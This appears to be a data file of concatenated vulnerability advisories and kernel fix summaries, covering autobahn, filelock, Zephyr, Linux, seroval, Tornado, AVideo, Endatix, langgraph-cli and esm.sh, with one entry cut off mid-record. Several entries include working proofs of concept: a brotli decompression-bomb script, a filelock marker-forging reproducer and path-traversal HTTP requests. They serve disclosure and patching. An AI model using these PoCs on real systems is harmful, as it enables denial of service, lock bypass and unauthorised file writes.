brotli ≥ 1.2.0 has `Decompressor.process(data, output_buffer_limit=N)`, so the backend can stop at `max_output_len` like deflate and bzip2 (and the extra's floor can be raised to `brotli>=1.2.0`).

Tested on autobahn 26.7.1 (latest) with brotli 1.2.0; `compress_brotli.py` on master is unchanged. This affects servers that enable permessage-brotli (opt-in, needs the `compress` extra).

### Proof of concept

How to run the PoC
```
python3 -m venv venv && . venv/bin/activate
pip install autobahn==26.7.1 brotli==1.2.0
python3 poc_autobahn.py
```

```python
# PoC: autobahn 26.7.1 permessage-brotli inflates a whole frame before maxMessagePayloadSize is checked.
import brotli, resource
from autobahn.websocket.compress import PerMessageBrotli

c = brotli.Compressor()  # build a 256 MiB-of-zeros frame without holding the plaintext
frame = b"".join(c.process(b"\0" * (1 << 20)) for _ in range(256)) + c.finish()
pmce = PerMessageBrotli(is_server=True, server_no_context_takeover=False, client_no_context_takeover=False)
pmce.start_decompress_message()
print(len(frame), "bytes on the wire; peak RSS before:", resource.getrusage(resource.RUSAGE_SELF).ru_maxrss >> 10, "MiB")
try:
    pmce.decompress_message_data(frame, max_output_len=1 << 20)  # remaining budget: 1 MiB
except Exception as e:
    print(type(e).__name__, "| peak RSS after:", resource.getrusage(resource.RUSAGE_SELF).ru_maxrss >> 10, "MiB")
```

Output:
```
421 bytes on the wire; peak RSS before: 36 MiB
PayloadExceededError | peak RSS after: 545 MiB
```

### Impact

An unauthenticated WebSocket client can make a server that enabled permessage-brotli allocate hundreds of MB or more per tiny frame, regardless of the configured `maxMessagePayloadSize`. That is the memory-exhaustion DoS GHSA-hxp9-w8x3-p566 was meant to prevent.

Credit goes to Adrian Korwel.

tipc: Dont send random pad bytes in RESET/ACTIVATE messages

The interface name is passed in a fixed length (TIPC_MAX_IF_NAME) buffer.
Replace the strcpy(data, l->if_name) with memcpy() so that the
pad bytes are actually written (l->if_name[] is zero padded)
rather than sending random bytes from the skb to the remote system.

Replace two other strcpy() with strscpy().

items.summary:
`SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async variants and a `FileLock` that has fallen back to a soft lock on `ENOSYS` decide from the record inside the marker file whether its owner is gone. The marker is the file whose presence says a process holds the lock. They do not check who could have written that record.

A local user who can write the marker but cannot remove it rewrites the holder's record to name a dead PID (process id). That position arises with an explicit `mode` with group or other write bits, or the default mode under a lax umask (the process setting that strips permission bits from new files), in a sticky or otherwise non-removable directory. The sticky bit is a directory flag that lets only a file's owner remove or rename it. The next contender running as the holder's account, or root, judges the lock stale, removes the live marker on that user's behalf and acquires it. Two processes then run the critical section together and neither gets an error. Affected versions are filelock 3.22.0 through 4.2.0 (finding `ANT-2026-W1H9NXUH`).

## Severity

**CVSS 3.1 `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N` scores 4.7 (Medium).** `AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:H` (high attack complexity): the marker must carry group or other write bits (an explicit permissive `mode`, or umask `002`/`000` with a shared group), and a contender of the holder's account must ask for the lock while the forged record is in place. `I:H` (high integrity impact): two holders then write whatever the lock protects, and the holder is not told. `C:N` and `A:N` (no confidentiality or availability impact). `S:U` (scope unchanged). Classification from the review: **security, conditional** on another user being able to write the live marker. The scanner rated it high (CWE-345). The default mode under umask `022` is not affected.

## Scope and preconditions

- The other user can write the marker. The application passes a `mode` with group or other write bits, which `fchmod` applies as given since 4.1.0. `0o666` is a common choice for a lock shared between accounts, although a soft-lock contender of another account waits as well on a `0o644` marker, since contenders only read and rename. Or the application uses the default mode (`0o666` through the umask) under umask `002` in a directory whose group the other user belongs to, or under umask `000`. The default mode under umask `022` is not affected.
- The other user cannot remove the marker itself: the directory is sticky, or the other user cannot write it at all (a `0755` directory owned by the lock's user gives the same overlap). In a non-sticky shared directory the other user can unlink the marker without filelock, and filelock adds nothing.
- A contender that may rename the marker asks for the lock: another process of the holder's account (several workers of one user) or root. A contender of another unprivileged account cannot rename the marker in a sticky directory and times out.
- The finding reaches every class that publishes a soft marker: `SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async variants, and `FileLock(mode=0o666)` on a filesystem where `flock` (a kernel lock on an open file) fails with `ENOSYS`.

These protections against another local user hold only when no other user can replace the lock's directory or any of its ancestors. That holds when each ancestor belongs to the user or root and is either not writable by others or sticky. A user who can rename entries in a non-sticky directory above the lock controls every name below it, which no file-based lock can defend against.

## Affected code

At the scanned commit b831496: the create mode in [`SoftFileLock._acquire`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L67-L71), the explicit-mode `fchmod` in [`_apply_explicit_mode`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L100-L105), the trusting verdict in [`_try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123) and the [`owner_is_stale`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_identity.py#L64-L79) it relies on; the same call in [`MarkerSoftFileLock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_marker.py#L74-L81) and [`SoftFileLease`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_lease.py#L229-L256).

## Introduced

The stale verdict that trusts the record came in with e35c3afac473 ("feat(soft): detect and break stale locks", #476, 2026-02-13), first released in 3.22.0. From then on a marker left group- or other-writable by the umask is forgeable. The reproducer's exact configuration, an explicit `mode=0o666` under umask `022`, needs 66d309d ("fix(soft): honour mode and tighten marker grammar", #807), first released in 4.1.0. Both match the git tags.

## Mechanism

A contender whose `O_CREAT | O_EXCL` create fails with `EEXIST` goes to `_try_break_stale_lock`. `_read_lock_file` makes sure the path is a regular file (`lstat`, `O_NOFOLLOW` open, `fstat`) and returns its content, mtime and inode (the kernel's identity for a file, independent of its name). It has the `fstat` result in hand but does not look at `st_uid` or `st_mode`. The code parses the content into `pid`, `hostname` and start token and hands them to `owner_is_stale`, whose docstring promises to return `True` "only when this process can prove the exact recorded owner is dead". That proof holds only if the owner wrote the record. A process of another account that can open the marker for writing uses `O_WRONLY | O_TRUNC` (no `O_CREAT`, so `fs.protected_regular` does not block it) and writes `2147483647\n<host>\n`, keeping the host line. The host matches, PID 2147483647 does not exist, and `owner_is_stale` returns `True`.

`break_lock_file` renames the marker to `<lock>.break.<pid>.<token>` and unlinks it. Its mtime and inode guard compares against what the contender read after the rewrite, so it passes. The contender, which runs as the marker's owner, does the rename, so the sticky bit allows it. On the next poll the contender's `O_EXCL` create succeeds. The first holder is not told: `SoftFileLock` has no heartbeat, and on release `_unlink_open_marker` finds another inode or no file at the path and returns without an error.

Other records lead to the same break, each run by the scanner the same way: the holder's own PID and host with a different third line (`owner_is_stale` reads a live PID with another start token as a recycled PID); an empty file (malformed, broken after `MALFORMED_LOCK_AGE_THRESHOLD`, 2 s). `MarkerSoftFileLock` and `SoftFileLease` apply `owner_is_stale` to the `pid=`, `host=` and `start=` fields of a protocol 2 record, and rewriting `pid=` admitted a second process for both. A `SoftFileLease` holder learns of it at its next heartbeat through `on_compromise`; `SoftFileLock` and `MarkerSoftFileLock` holders do not learn of it at all.

The marker becomes writable by another account in two ways. An explicit `mode` with group or other write bits goes through `fchmod`, so the umask does not narrow it (`test_lock_mode_soft` at the scanned commit pins `-rw-rw-rw-` under umask `022`). The default mode passes `0o666` to `os.open`, so under umask `002` the marker is `0o664`. With no `mode` argument, in a setgid and sticky group directory (`3770`), a second member of the group rewrote the marker and a second process of the holder's user acquired the same way. Under umask `000` the marker is `0o666` and any local user can rewrite it. `FileLock(mode=0o666)` on a filesystem where `flock` fails with `ENOSYS` falls back to `SoftFileLock` and produces the same `-rw-rw-rw-` marker (confirmed with `fcntl.flock` replaced by a stub raising `ENOSYS`). With `mode=0o644`, or no `mode` under umask `022`, the other user's open fails with `EACCES` and the second process times out.

## Reproduction

The scanner's reproducer for `ANT-2026-W1H9NXUH`, quoted as received. It ran against commit `b831496b0273`.

**`repro`**

```python
#!/usr/bin/env python3
import os
import pwd
import shutil
import stat
import subprocess
import sys
import tempfile
import time

# root bypasses file permissions, so each party runs as one of the image's unprivileged accounts
AS_VICTIM = ["runuser", "-u", "victim", "--", sys.executable]
AS_ATTACKER = ["runuser", "-u", "attacker", "--"]
WORKER = "/tmp/repro.d/worker.py"
REWRITE_MARKER = "/tmp/repro.d/rewrite_marker.py"

# set up: a sticky, world-writable directory like /tmp; both workers print "entered" / "left" into one shared log
shared_dir = tempfile.mkdtemp(prefix="shared-", dir="/tmp")
os.chmod(shared_dir, 0o1777)
lock_path = os.path.join(shared_dir, "cache.lock")
log_path = os.path.join(shared_dir, "order.log")
log = open(log_path, "w")

first = subprocess.Popen([*AS_VICTIM, WORKER, lock_path, "first", "6"], stdout=log)
while "first entered" not in open(log_path).read():
    assert first.poll() is None, "the first worker did not get the lock"
    time.sleep(0.05)

marker = os.stat(lock_path)
print("marker:", stat.filemode(marker.st_mode), pwd.getpwuid(marker.st_uid).pw_name, repr(open(lock_path).read()))

# before the attack: the second worker times out, and the attacker cannot delete the marker from the sticky directory
second_before = subprocess.run([*AS_VICTIM, WORKER, lock_path, "second", "0.5"], stdout=log, stderr=subprocess.PIPE, text=True)
print("second worker:", second_before.stderr.splitlines()[-1])
assert "Timeout" in second_before.stderr
rm = subprocess.run([*AS_ATTACKER, "rm", "-f", lock_path], capture_output=True, text=True)
print("attacker:", rm.stderr.strip())
assert rm.returncode != 0

# attack: no check=True, because under a fix the marker is not writable by others, and then this step fails
subprocess.run([*AS_ATTACKER, sys.executable, REWRITE_MARKER, lock_path])
print("marker after the attack:", repr(open(lock_path).read()))

# the second worker tries again, exactly as before
subprocess.run([*AS_VICTIM, WORKER, lock_path, "second", "0.5"], stdout=log)
print("first worker exit status:", first.wait())

# check: a correct lock keeps the second worker out until the first has left
order = open(log_path).read().splitlines()
print("order:", order)
shutil.rmtree(shared_dir)
print("BUG" if order == ["first entered", "second entered", "second left", "first left"] else "OK")
```

**`repro.d/rewrite_marker.py`**

```python
#!/usr/bin/env python3
# The attacker, another account: overwrite the live holder's record in place with one naming a PID that cannot exist.
import os
import sys

lock_path = sys.argv[1]
NO_SUCH_PID = 2**31 - 1  # the largest PID the marker parser accepts; Linux pid_max is at most 2**22

holder_host = open(lock_path).read().splitlines()[1]  # owner_is_stale only judges records from its own host
marker = os.open(lock_path, os.O_WRONLY | os.O_TRUNC)  # no O_CREAT, so fs.protected_regular does not refuse it
os.write(marker, f"{NO_SUCH_PID}\n{holder_host}\n".encode())
os.close(marker)
```

**`repro.d/worker.py`**

```python
#!/usr/bin/env python3
# One of several workers of the victim's application; they take turns under a soft lock in a shared directory.
import sys
import time

from filelock import SoftFileLock

lock_path, name, work_seconds = sys.argv[1], sys.argv[2], float(sys.argv[3])

# mode=0o666 so that the lock file can be used from several accounts
with SoftFileLock(lock_path, mode=0o666, timeout=1):
    print(name, "entered", flush=True)
    time.sleep(work_seconds)
    print(name, "left", flush=True)
```

## Attack sequence

```mermaid
sequenceDiagram
    participant H as holder (uid victim)
    participant M as cache.lock (0666, owner victim, sticky dir)
    participant A as other account (uid attacker)
    participant C as contender (uid victim)
    H->>M: O_CREAT|O_EXCL create, fchmod 0o666, write "pid host token"
    C->>M: O_EXCL fails, read record: holder alive, Timeout
    A->>M: rm: EPERM (sticky directory)
    rect rgb(255, 214, 214)
        A->>M: open O_WRONLY|O_TRUNC, write "2147483647 host"
        C->>M: read record, owner_is_stale: PID 2147483647 is dead
        C->>M: rename to cache.lock.break.*, unlink (the owner may)
        C->>C: next poll: O_EXCL succeeds, enters beside H
        Note over H,C: both inside, no error, H's release finds another inode and returns
    end
```

## Evidence

The scanner's reproducer runs two `victim` workers on `with SoftFileLock(path, mode=0o666, timeout=1):` in a root-owned `1777` directory under `/tmp` (overlayfs, `fs.protected_regular=2`), with `attacker` uid 1001 sharing no group with `victim`. It printed the marker as `-rw-rw-rw- victim '<pid>\n<host>\n<start token>\n'`, the second worker's `Timeout`, `rm: cannot remove ...: Operation not permitted` for `attacker`, the marker after the rewrite as `'2147483647\n<host>\n'`, first worker exit status 0, and the log order `['first entered', 'second entered', 'second left', 'first left']`. The second worker entered and left while the first was still inside its `with` block, about 50 ms after the rewrite, on its second poll. It prints `BUG` every time, in about 6 s. Our review ran the same reproducer: `BUG` on 4.2.0, `OK` on the head of #836. The review also tried umask `000` with the default mode.

## Impact

A local user who can write a soft lock's marker but cannot remove it gets a second process admitted into the critical section while the first holder is still inside. With no `lifetime` set, `SoftFileLock` and `MarkerSoftFileLock` give neither process a signal. Whatever the lock protects (a cache, an install directory, a state file) then has two concurrent writers. The other user chooses the moment and gains nothing else: it touches no file other than the marker. The process that rewrites the record runs under a different UID from the holder; the same-UID contender only follows the protocol.

## Workarounds

Do not give soft markers group or other write bits: pass no `mode` (or `mode=0o644`) under umask `022`. A soft-lock contender of another account waits as well on a `0o644` marker, because contenders only read and rename. The write bits matter only for the native `flock` lock and for `FileLock`'s first open before it falls back to a soft lock. Avoid umask `002` or `000` for processes that take soft locks in directories shared with other accounts, and keep lock files in a directory other users cannot write.

## Patched version

4.2.1.

Fix: https://github.com/tox-dev/filelock/pull/836

items.summary:
ethernet_fill_header() in subsys/net/l2/ethernet/ethernet.c can prepend the Ethernet header in place, by pushing it into the headroom of the packet's first fragment, instead of allocating a separate header fragment. Before this fix the in-place path was selected purely from the build-time value of CONFIG_NET_L2_ETHERNET_RESERVE_HEADER, with no check that the packet actually has that headroom, and then called net_buf_push(pkt->buffer, hdr_len). Only Ethernet TX allocations reserve that space: net_pkt_alloc_buffer() invokes the L2 alloc hook (ethernet_l2_alloc()) only when is_pkt_tx() is true and the packet's interface is the Ethernet interface.

A packet that was allocated by a different L2 and then handed to Ethernet for transmission therefore has too little (usually zero) headroom. Such packets are produced by ordinary routing and tunnelling paths: net_route_packet_if() re-targets a received packet to another interface when CONFIG_NET_IPV4_FORWARDING / CONFIG_NET_IPV6_FORWARDING are enabled (for example an 802.15.4/OpenThread or PPP interface forwarding to Wi-Fi/Ethernet), net_route_ipv6_mcast_forward_packet() forwards an RX-slab clone that carries no reserve, and the IPIP tunnel interface_send() prepends an outer IP header allocated on the virtual interface. In these configurations a remote or adjacent attacker triggers the condition simply by sending traffic that the device forwards.

Because net_buf_simple_push() only asserts on the headroom bound, a build without CONFIG_ASSERT (and without the newer CONFIG_NET_BUF_HARDENING) moves the fragment data pointer below the start of its data block and writes 14 bytes — 18 with VLAN — of Ethernet header out of bounds. With the default fixed-size buffer pools this overwrites the tail of the neighbouring buffer's payload or memory preceding the pool array; with variable-size pools it overwrites the buffer reference count and the heap chunk header. The attacker controls neither the written bytes nor the offset, so the practical impact is memory corruption leading to a crash, packet corruption, or heap inconsistency rather than controlled code execution. The fix takes the in-place path only when net_buf_headroom(pkt->buffer) is large enough and otherwise falls back to a separate header fragment.

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

ipv6: mcast: use rcu_assign_pointer() for __rcu list updates

Several places in net/ipv6/mcast.c update RCU-protected lists
(np->ipv6_mc_list, idev->mc_list, idev->mc_tomb) using direct pointer
assignments instead of rcu_assign_pointer():

1. In __ipv6_dev_mc_dec(), unlinking a group from idev->mc_list did:
       *map = ma->next;
   without rcu_assign_pointer() while concurrent readers traverse
   idev->mc_list locklessly under rcu_read_lock().
2. In ipv6_sock_mc_drop() and __ipv6_sock_mc_close(), unlinking a group
   from np->ipv6_mc_list directly assigned *lnk = mc_lst->next and
   np->ipv6_mc_list = mc_lst->next without rcu_assign_pointer(), racing
   with lockless readers in inet6_mc_check().
3. In __ipv6_sock_mc_join(), mc_lst->next was initialized to
   np->ipv6_mc_list via raw assignment before publishing mc_lst.
4. In mld_del_delrec() and __ipv6_dev_mc_inc(), __rcu source pointers
   passed into rcu_assign_pointer() lacked explicit dereference helpers.

Fix these by consistently using rcu_assign_pointer() along with
mc_dereference() / sock_dereference().

OpenAM (Open Identity Platform) is an open-source Identity and Access Management (IAM) platform derived from ForgeRock OpenAM, providing SSO, OAuth2, SAML, and OpenID Connect capabilities. It is widely deployed in enterprise environments as a central authentication gateway.

The `/sessionservice` endpoint, used for internal session management operations, does not sufficiently restrict the URLs that authenticated users may register for session event notifications. items.summary:
### Summary

seroval writes a typed array as a call to its constructor. In affected versions, the constructor name in the output is read from a property that data on the value can replace, and it is written without checks. A typed array that received properties from untrusted data can then put arbitrary code into the serialized output.

### Details

Version 1.6.0 changed how seroval finds the class of an object, so that objects with their own `constructor` property serialize correctly. Typed arrays still took the constructor name from the value itself, so the name could come from the untrusted property instead of the array's real type.

These functions are affected:

- `serialize`, `serializeAsync`
- `crossSerialize`, `crossSerializeAsync`, `crossSerializeStream`
- the `Serializer` class
- `compileJSON`

`fromJSON` and `fromCrossJSON` are not affected: they only accept the names of the built-in typed arrays. With the `compactArrayBufferViews` option, the same lookup throws a `TypeError` instead of writing code.

### Impact

An application is affected only when it serializes a typed array that has an own `constructor` property set from untrusted data. That requires code that copies properties from untrusted objects onto a typed array. This is unusual, so the severity is rated Low, even though the result is script execution in the page that receives the output.

### Patches

Fixed in 1.6.11. The constructor name now comes from the array's internal type, which properties on the value cannot change. `compactArrayBufferViews` uses the real type as well.

### Workarounds

If you cannot upgrade, do not copy properties from untrusted objects onto typed arrays, or remove an own `constructor` property from a typed array before serializing it.

items.summary:
### Summary

Tornado's HTTP header parser takes quadratic time (O(n²)) when a header value is continued across many "obsolete line folding" (obs-fold) lines. An unauthenticated attacker can send a request whose header block is mostly short continuation lines. Parsing it uses a large amount of CPU on the IOLoop thread and blocks every other connection that process is serving.

This issue is closely related to CVE-2025-67725 (GHSA-c98p-7wgm-6p64). The fix for that advisory covered repeated headers but not line-folded continuations.

### Impact

All Tornado HTTP servers are affected. Header parsing runs before any application code, so no authentication or particular handler is required.

How bad it gets depends on `max_header_size`:

- **Default (64 KB):** each malicious request blocks the event loop for tens of milliseconds. Repeated requests can degrade service.
- **Raised `max_header_size`:** the cost grows with the square of the header size. A single 1 MB request can block the process for several seconds.

Only availability is affected. Confidentiality and integrity are not.

### Patches

Fixed in Tornado 6.6 by removing support for obsolete line folding completely; header lines that begin with whitespace are now rejected.

### Workarounds

- Keep `max_header_size` at its default value or lower it. This limits the impact but doesn't remove it.
- Run Tornado behind a reverse proxy that rejects or normalizes obsolete line folding before forwarding requests.

### Credit

Reported by @manus-pi.

items.summary:
### Summary

When Tornado reads an HTTP/1.1 body that uses chunked transfer encoding, it processes all chunks that have already arrived without yielding to the event loop. A client can send a body made of millions of 1-byte chunks, which blocks the event loop (and therefore every other connection served by that process) for the entire time it takes to parse the body. A body near the default `max_body_size` of 100 MB can block the process for close to a minute, and the attacker can repeat or parallelize these requests.

Bodies made of tiny chunks also consumed far more memory than their size: a handler that does not use `@stream_request_body` stored each chunk as a separate object, using roughly 20 times as much memory as the bytes received.

### Impact

All Tornado HTTP servers are affected when they receive a request body for a handler that reads it, which includes any handler that does not reject the request before the body is read. No authentication is required. Lowering `max_body_size` reduces the maximum blocking time and memory use for each request but does not remove the issue.

`SimpleAsyncHTTPClient` is affected in the same way when it reads a response from a malicious server.

### Patches

Fixed in Tornado 6.6. Tornado now yields to the event loop periodically while reading any body, combines small chunks before passing them to `data_received`, and stores non-streaming bodies more compactly.

Applications using `@stream_request_body` should note that the pieces passed to `data_received` no longer correspond to HTTP chunk boundaries.

### Workarounds

- Run Tornado behind a reverse proxy that buffers request bodies and forwards them with a `Content-Length` header instead of chunked encoding.
- Lower `max_body_size` (for the whole server or for individual handlers) to limit the impact of each request.

### Credit

Reported by [uttej-badwane](https://github.com/uttej-badwane).

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

tun: Fix memory leak for detached NAPI queue.

syzkaller reported [0] memory leaks of sk and skb related to the TUN
device with no repro, but we can reproduce it easily with:

  struct ifreq ifr = {}
  int fd_tun, fd_tmp;
  char buf[4] = {};

  fd_tun = openat(AT_FDCWD, "/dev/net/tun", O_WRONLY, 0);
  ifr.ifr_flags = IFF_TUN | IFF_NAPI | IFF_MULTI_QUEUE;
  ioctl(fd_tun, TUNSETIFF, &ifr);

  ifr.ifr_flags = IFF_DETACH_QUEUE;
  ioctl(fd_tun, TUNSETQUEUE, &ifr);

  fd_tmp = socket(AF_PACKET, SOCK_PACKET, 0);
  ifr.ifr_flags = IFF_UP;
  ioctl(fd_tmp, SIOCSIFFLAGS, &ifr);

  write(fd_tun, buf, sizeof(buf));
  close(fd_tun);

If we enable NAPI and multi-queue on a TUN device, we can put skb into
tfile->sk.sk_write_queue after the queue is detached.  We should prevent
it by checking tfile->detached before queuing skb.

Note this must be done under tfile->sk.sk_write_queue.lock because write()
and ioctl(IFF_DETACH_QUEUE) can run concurrently.  Otherwise, there would
be a small race window:

  write()                             ioctl(IFF_DETACH_QUEUE)
  `- tun_get_user                     `- __tun_detach
     |- if (tfile->detached)             |- tun_disable_queue
     |  `-> false                        |  `- tfile->detached = tun
     |                                   `- tun_queue_purge
     |- spin_lock_bh(&queue->lock)
     `- __skb_queue_tail(queue, skb)

Another solution is to call tun_queue_purge() when closing and
reattaching the detached queue, but it could paper over another
problems.  Also, we do the same kind of test for IFF_NAPI_FRAGS.

xfrm: Zero padding when dumping algos and encap

In the Linux kernel, the following vulnerability has been resolved:

spi: bcm-qspi: return error if neither hif_mspi nor mspi is available

If neither a "hif_mspi" nor "mspi" resource is present, the driver will
just early exit in probe but still return success. Apart from not doing
anything meaningful, this would then also lead to a null pointer access
on removal, as platform_get_drvdata() would return NULL, which it would
then try to dereference when trying to unregister the spi master.

Fix this by unconditionally calling devm_ioremap_resource(), as it can
handle a NULL res and will then return a viable ERR_PTR() if we get one.

The "return 0;" was previously a "goto qspi_resource_err;" where then
ret was returned, but since ret was still initialized to 0 at this place
this was a valid conversion in 63c5395bb7a9 ("spi: bcm-qspi: Fix
use-after-free on unbind"). The issue was not introduced by this commit,
only made more obvious.

items.summary: AVideo is a video-sharing Platform. Prior to 8.1.0, `view/queue.php` uses `pathinfo` on the caller-controlled `fileURI` and stores its filename through `setTitle` in `encoder_queue.title` without neutralization. `fileURI` is not in the `objects/security.php` filter lists, and the `Login::canUpload()` capability needed to submit a queue entry can be self-granted using an attacker-controlled login site without legitimate encoder credentials. `view/index.php` loads `queue.json` from `view/queue.json.php` into the `#grid` jQuery Bootgrid table; its title formatter concatenates `row.title` into raw cell HTML. An attacker can therefore store an HTML title whose event handler runs in a privileged viewer's browser. `Encoder::getAll` limits nonadministrators to their own streamer's rows, so the victim must be an administrator who sees all rows or an operator on the attacker's streamer. A second `.html()` sink in the progress panel uses the same title but additionally depends on a helper script loaded from the streamer; the Bootgrid sink is reachable from encoder code alone. The script can read session-visible data and rendered streamer credentials, act with the viewer's privileges, and execute again for each qualifying viewer until the row is removed. This issue is fixed in version 8.1.0.

items.summary: Endatix is a self-hosted form and survey management platform with a headless API. Prior to 0.7.0, the anonymous `POST /forms/{formId}/submissions` endpoint stores attacker-controlled `JsonData` after checking only that the JSON is well formed. A file object with `name`, `type` and `content` fields can contain an HTTP or HTTPS URL. When a staff member with `submissions.view` permission invokes `POST /forms/{formId}/submissions/{submissionId}/files`, `GetFilesHandler` passes the stored data to `SubmissionFileExtractor` in `src/Endatix.Infrastructure/Features/Submissions/SubmissionFileExtractor.cs`, which calls `HttpClient.GetAsync` without validating the destination URL, host or resolved IP addresses against internal address ranges. This permits stored, second-order server-side GET requests to internal services, cloud metadata, loopback and link-local addresses from the server's network position. The form must have `IsPublic` and `IsEnabled` set, and an anonymous submission must pass reCAPTCHA v3 when configured. The fetched response is placed in the staff viewer's ZIP, not returned directly to the attacker, so disclosure to the attacker is blind or indirect through observable request behavior or information exposed by the viewer. No integrity or availability impact is asserted; data: and raw-base64 `content` are decoded locally without network requests. This issue is fixed in version 0.7.0.

items.summary:
### Summary

seroval writes a `RegExp` as a regular expression literal. In affected versions, the `<` character in a `RegExp` source is written without escaping. A source built from untrusted input can then end the HTML `<script>` element that the serialized output is placed in, and run script in the page.

### Details

seroval escapes `<` in strings, so string values cannot end a `<script>` element. `RegExp` sources did not get the same escaping:

- Versions before 1.0.0 wrote the source as is.
- Version 1.5.5 stopped escaping `<` in `RegExp` sources, so that named groups and lookbehinds keep working. This removed the escaping for every `<` in a source.

These functions are affected:

- `serialize`, `serializeAsync`
- `crossSerialize`, `crossSerializeAsync`, `crossSerializeStream`
- the `Serializer` class
- `compileJSON`

`toJSON`, `fromJSON`, `toCrossJSON` and `fromCrossJSON` are not affected, because they never produce JavaScript.

### Impact

An application is affected when all of these are true:

1. It builds a `RegExp` from untrusted input that is used as regular expression syntax. Input passed through an escaping helper (such as an `escapeRegExp` function) is not enough to exploit this.
2. It serializes that `RegExp` with one of the functions above.
3. It places the output inside an HTML `<script>` element, as server rendering usually does.

In that case an attacker can run script in the page of any user who receives that output.

### Patches

Fixed in 1.6.10. A `RegExp` whose source contains `<` is now written with the `RegExp` constructor and an escaped string source. Named groups and lookbehinds keep working.

### Workarounds

If you cannot upgrade:

- Do not serialize a `RegExp` built from untrusted pattern syntax. Send its source and flags as strings, and build the `RegExp` on the client.
- Or reject patterns that contain `<` before they reach the serializer.

items.summary:
### Summary

`langgraph deploy --verbose` printed the temporary registry push token that the CLI uses to log Docker in to the deployment's image registry. Anyone who could read that output, for example in CI logs, could use the token until it expired.

### Details

When Docker is available, `langgraph deploy` builds the image locally, requests a push token from LangSmith, and runs `docker login --password-stdin` with the token on stdin. The CLI's subprocess helper printed each command's stdin when verbose output was on, and the login step inherited `--verbose`, so the token was printed right after the `docker login` command line.

`langgraph-cli` 0.4.15 through 0.4.31 are affected. Starting with 0.4.32, the login step runs without verbose output. Deploys run without `--verbose`, and deploys that build the image remotely, never printed the token.

### Impact

You may be affected if you ran `langgraph deploy --verbose` with an affected version and the output was kept or shared, for example in CI logs or terminal recordings. The token is short-lived (at most 12 hours) and limited to that deployment's image repository. Someone holding it before it expired could pull the deployment's images and push new images to that repository. Deployments reference their image by digest, so a pushed image does not run unless the deployment is updated to use it, which requires a LangSmith API key with access to the deployment.

### Remediation

Upgrade to `langgraph-cli` 0.4.32 or later. 0.4.37 also stops `--verbose` from printing the input of any command the CLI runs. Tokens printed more than 12 hours ago have expired.

items.summary: ## Summary A path-traversal flaw in the handling of the `X-Zone-Id` HTTP header allows an attacker to cause the application to write files outside the intended storage location. The header value is used to build a filesystem path but is not properly canonicalized or restricted to the application’s storage base directory. As a result, supplying `../` sequences in `X-Zone-Id` causes files to be written to arbitrary directories (example observed: `~/.esmd/modules/transform//` instead of `~/.esmd/storage/modules/transform`). **Severity:** Medium **Component / Endpoint:** `POST /transform` — handling of `X-Zone-Id` header The vulnerable code is in https://github.com/esm-dev/esm.sh/blob/main/server/router.go#L116 and https://github.com/esm-dev/esm.sh/blob/main/server/router.go#L411 **Impact:** Arbitrary file creation / overwrite outside intended storage directory (file write to attacker-controlled path). Possible remote code execution, persistence, tampering with application files, or facilitating further path-traversal attacks. --- ## Proof of Concept (POC) Request (attacker-supplied `X-Zone-Id` contains path traversal): ``` POST /transform HTTP/1.1 Host: localhost:8888 User-Agent: Den/8.7.1 Accept: */* Connection: keep-alive Referer: http://localhost:9999/ Content-Type: application/json X-Zone-Id: ../../modules/transform/c245626ef6ca0fd9ee37759c5fac606c6ec99daa/ Content-Length: 325 { "filename": "example2.js", "lang": "js", "code": "console.log('hello');", "importMap": { "imports": { "react": "https://esm.sh/react", "react-dom": "https://esm.sh/react-dom" } }, "jsxImportSource": "react", "target": "es2022", "sourceMap": "external", "minify": true } ``` Observed result: file written to `~/.esmd/modules/transform/c245626ef6ca0fd9ee37759c5fac606c6ec99daa/example2.js` instead of the intended `~/.esmd/storage/modules/transform/`. This can be trigger with another path traversal request below ``` GET /+c245626ef6ca0fd9ee37759c5fac606c6ec99daa./../../../esm.db?.css HTTP/1.1 Host: localhost:8888 User-Agent: localhost Accept: */* Connection: keep-alive X-Zone-Id: ../ Referer: http://localhost:9999/ ``` --- ## Remediation Simply remove any .. in the `X-Zone-Id` header before actually process the file. ## Credits - [Ai Ho (Jessie)](https://github.com/j3ssie) - [CL Yang](https://github.com/A11riseforme)
